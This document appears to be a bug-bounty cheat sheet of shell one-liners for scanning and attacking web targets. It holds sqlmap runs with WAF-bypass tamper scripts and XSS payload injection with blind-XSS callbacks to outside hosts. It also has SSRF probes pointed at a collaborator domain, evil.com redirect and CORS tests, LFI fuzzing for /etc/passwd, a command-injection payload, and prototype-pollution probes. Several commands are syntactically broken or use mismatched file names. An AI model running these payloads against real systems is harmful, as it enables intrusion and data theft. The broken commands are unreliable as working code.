# Additional commands for manual execution

##vulns
# Check for WAF protection
wafw00f -i "reconDir/httpx.txt" -o "reconDir/wafw00f.txt"

# Run nuclei vulnerability scanner
nuclei -l "reconDir/httpx.txt" -o "reconDir/nuclei/nuclei.txt"


# Run SQLMap on potential SQL injection points
sqlmap -m "reconDir/gf-data/sqli.urls" --level 5 --risk 3 --batch --random-agent --dbs --tamper=between | tee  reconDir/vulns/sqliSqlmap.txt

for i in $(cat "reconDir/gf-data/sqli.urls"); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done  | tee  reconDir/vulns/sqliGhauri.txt

find -type f -name "log" -exec sh -c 'grep -q "Parameter" "{}" && echo "{}: SQLi"' \;

# XSS scanning with dalfox
dalfox -b hahwul.xss.ht file "reconDir/gf-data/xss.urls" -o reconDir/vulns/dalfox_xss.txt
dalfox file "reconDir/gf-data/xss.urls" -b https://blindf.com/bx.php --custom-payload $custom_payload_path -o reconDir/vulns/xss_dalfox.txt
cat "reconDir/waybackurls.txt" | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe -o reconDir/vulns/xss_dalfox_gxss.txt

cat "reconDir/waybackurls.txt" | grep "=" | sed 's/=.*/=/' | sed 's/URL: //' | tee reconDir/vulns/tetxss.txt ; dalfox file reconDir/vulns/testxss.txt -b yours.xss.ht -o  reconDir/vulns/xss_dalfox_sed.txt

#XSS from  waybackurls
grep "=" reconDir/waybackurls.txt | egrep -iv "\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)$" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | tee -a reconDir/vulns/freq_xss_output | grep -iv "Not Vulnerable" | tee -a "reconDir/vulns/xss_qsreplace.txt"

##CORS
     cat reconDir/waybackurls.txt | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done  | tee -a "reconDir/vulns/CORS.txt"





# LFI 
cat "reconDir/gf-data/lfi.urls" | qsreplace FUZZ | while read url ; do ffuf -u \$url -mr \"root:x\" -w /path/to/lfi-payloads.txt ; done"

#openredirect
cat "reconDir/waybackurls.txt" | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L host -I | grep "http://evil.com" && echo -e "host \033[0;31mVulnerable\n" ;done | tee "reconDir/vulns/openredirect.txt"

cat "reconDir/waybackurls.txt" | grep "=" | sort -u | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain' >> "reconDir/vulns/openredirect.txt" 




#SSRF
cat "reconDir/gf-data/ssrf.urls" | qsreplace "http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" | tee "reconDir/gf-data/ssrf.urls_ffuf" | ffuf -c -w - -u FUZZ -t 200 >> reconDir/vulns/ssrf_ffuf.txt

#subdomain Discovery
dig axfr target.com @10.10.10.123
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000-trick.txt \
     -u https://target.com \
     -H "Host: FUZZ.target.com" \
     -mc 200,302 -o reconDir/subdomains/ffuf_results.txt

#Prototype Pollutions
cat  reconDir/httpx.txt && sed 's/$/\/?__proto__[testparam]=exploit\//'  reconDir/http_alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | tee reconDir/vulns/prototype.txt


#contents dicovery

cat reconDir/httpx.txt | xargs -P 10 -I {} sh -c 'dirb "{}" /usr/share/wordlists/dirb/common.txt -o "reconDir/contents/dirb_$(echo {} | sed "s|https\?://||g" | tr "/" "_").txt"'

cat reconDir/httpx.txt | xargs -P 10 -I {} sh -c 'wfuzz -u {}/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 404 > "reconDir/contents/wfuzz_$(echo {} | sed "s|https\?://||g" | tr "/" "_").txt"'

cat reconDir/httpx.txt | xargs -P 10 -I {} sh -c 'ffuf -u {}/FUZZ -w /usr/share/wordlists/dirb/common.txt -o "reconDir/contents/ffuf_$(echo {} | sed "s|https\?://||g" | tr "/" "_").txt"'

cat reconDir/httpx.txt | xargs -P 10 -I {} sh -c | 'dirsearch -e php,asp,aspx,jsp,html,zip,jar -w /usr/share/wordlists/dirb/common.txt -t 30 -r -R 3 --recursion-status 200-399 -u % -o "reconDir/contents/dirsearch_$(echo {} | sed "s|https\?://||g" | tr "/" "_").txt"'

cat reconDir/httpx.txt | xargs -P 10 -I {} sh -c | 'dirsearch  --full-url --recursive --exclude-sizes=0B --random-agent -e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb~,php,php~,bkp,cache,cgi,inc,js,json,jsp~,lock,wadl -o "reconDir/contents/dirsearch_$(echo {} | sed "s|https\?://||g" | tr "/" "_").txt"'


#sensitive file
cat "reconDir/waybackurls.txt" | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | tee reconDir/vulns/sensitive.txt


#nmap
cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | egrep -v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt'

#favicon
curl https://favicon-hash.kmsec.uk/api/?url=https://target.com/favicon.ico | jq |  tee reconDir/contents/favicon.js

##need to tune

#extracting Js endpoints

cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
##download JS files
# curl
mkdir -p js_files; while IFS= read -r url || [ -n "$url" ]; do filename=$(basename "$url"); echo "Downloading $filename JS..."; curl -sSL "$url" -o "downloaded_js_files/$filename"; done < "$1"; echo "Download complete."
# wget
sed -i 's/\r//' js.txt && for i in $(cat js.txt); do wget "$i"; done

#hidden parmeter in js
cat subs.txt | (gau || hakrawler || waybackurls || katana) | sort -u | httpx -silent -threads 100 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done

#extract sensitive endpoints in js
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

#dependency confusion

[ -f "urls.txt" ] && mkdir -p downloaded_json && while read -r url; do wget -q "$url" -O "downloaded_json/$(basename "$url")" && scan_output=$(confused -l npm "downloaded_json/$(basename "$url")") && echo "$scan_output" | grep -q "Issues found" && echo "Vulnerability found in: $(basename "$url")" || echo "No vulnerability found in: $(basename "$url")"; done < <(cat urls.txt)


# Sqlmapwaf bypass
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent
#censys
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
#shodan
shodan search Ssl.cert.subject.CN:"target.com" --fields ip_str | anew ips.txt
cat my_ips.txt | xargs -L 100 shodan scan submit --wait 0


#ssti
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
echo target.com | gau --subs --threads 200 | httpx -silent -mc 200 -nc | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt && ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080



